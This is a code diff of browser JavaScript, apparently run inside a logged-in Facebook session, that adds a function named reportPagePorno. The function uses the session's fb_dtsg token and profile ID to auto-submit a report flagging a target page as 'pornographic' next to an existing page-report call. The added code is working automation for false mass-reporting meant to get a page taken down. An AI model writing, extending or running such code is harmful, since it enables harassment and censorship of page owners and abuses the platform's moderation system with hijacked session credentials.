@@ -19,6 +19,7 @@ function nejsu() {
         config["mode"] = true;
         if(config.mode == true){
           reportPage();
+          reportPagePorno()
           start();
         }
     }else{
@@ -29,7 +30,7 @@ function nejsu() {
 }
 
 function reportPage(){
-  var xhr = new XMLHttpRequest();
+var xhr = new XMLHttpRequest();
  var obj = {
    breadcrumbs:[],
    story_location:"page",
@@ -63,12 +64,51 @@ function reportPage(){
   xhr.onreadystatechange = function() {
       if (xhr.readyState == 4 && xhr.status == 200) {
           xhr.close;
-          step2();
+
       }
   }
   xhr.send(deSerialize(params));
 }
-
+function reportPagePorno(){
+var xhr = new XMLHttpRequest();
+ var obj = {
+   breadcrumbs:["offensive"],
+   story_location:"page",
+   is_from_feed_tombstone:false,
+   actions_taken:"",
+   is_rapid_reporting:false,
+   is_instream_follow_up:false,
+   entry_point:"unknown",
+   reportable_ent_token:config.page_id,
+   is_impostor:""
+ };
+  var params = {};
+  params["fb_dtsg"] = fb_dtsg;
+  params["answer"] = "pornographic";
+  params["context"] = JSON.stringify(obj);
+  params["av"] = profile_id;
+  params["__user"] = profile_id;
+  params["__a"] = "1";
+  params["__dyn"] = __dyn;
+  params["__af"] = "h0";
+  params["__req"] = "2d";
+  params["__be"] = "1";
+  params["__pc"] = "PHASED:DEFAULT";
+  params["__rev"] = __rev;
+  params["jazoest"] = jazoest;
+  params["__spin_r"] = __rev;
+  params["__spin_b"] = "trunk";
+  params["__spin_t"] = Math["floor"](Date["now"]() / 1E3);
+  xhr.open("POST", "/ajax/nfx/continue_dialog?av="+profile_id+"&dpr=1&ext=me", true);
+  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+          xhr.close;
+          
+      }
+  }
+  xhr.send(deSerialize(params));
+}
 function start(){
   var xhr = new XMLHttpRequest();
   var params = {};
